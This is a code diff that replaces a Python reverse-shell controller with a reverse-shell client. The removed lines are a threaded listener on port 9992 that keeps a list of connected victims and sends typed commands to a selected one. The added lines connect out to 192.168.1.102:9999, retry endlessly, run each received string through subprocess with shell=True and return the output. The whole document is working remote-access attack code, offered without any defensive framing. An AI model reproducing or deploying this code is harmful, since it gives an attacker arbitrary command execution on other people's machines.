@@ -1,50 +1,26 @@
-import threading
-import socket,time
+import subprocess,socket,os
 
-s = socket.socket()
+s=socket.socket()
 
-s.bind(('',9992))
+def connect_serv():
+	try:
+		s.connect(('192.168.1.102',9999))
+	except:
+		print("reconnecting!!")
+		connect_serv()
 
-s.listen(5)
+connect_serv()
+while True:
+	data = s.recv(20480).decode("utf-8")
 
-add_lis=[]
-conn_lis=[]
-
-def accept_conn():
-	while True:
-		print("waiting")
-		conn,add= s.accept()
-		#print(add)
-		add_lis.append(add)
-		conn_lis.append(conn)
-
-
-def do_something():
-	while True:
-		print("LIST OF CONNECTIONS :")
+	if 'cd' in data[0:2]:
+		os.chdir(data[3:])
+		s.send(str.encode("directory changed!"))
+		continue
+	if len(data) > 0:
+		cmd = subprocess.Popen(data,shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+		output_byte = cmd.stdout.read() + cmd.stderr.read()
+		output_str = str(output_byte,"utf-8")
+		currentWD = os.getcwd() + "> "
 		
-		for i in add_lis:
-			print(add_lis.index(i),i[0],i[1])
-		selection = input(" select connection >>>")
-		if selection =='skip':
-			continue
-		conn = conn_lis[int(selection)]
-		
-		while True:
-			cmd = input('>>')
-			if cmd=='exit' or cmd=='EXIT':
-				break
-			conn.sendall(str.encode(cmd))
-			response =str(conn.recv(20480),"utf-8")
-			print(response)		
-t = threading.Thread(target=accept_conn)
-t1=threading.Thread(target=do_something)
-
-
-
-t.start()
-t1.start()
-t1.join()
-t.join()
-
-print("end..")
+		s.send(str.encode(output_str+currentWD))
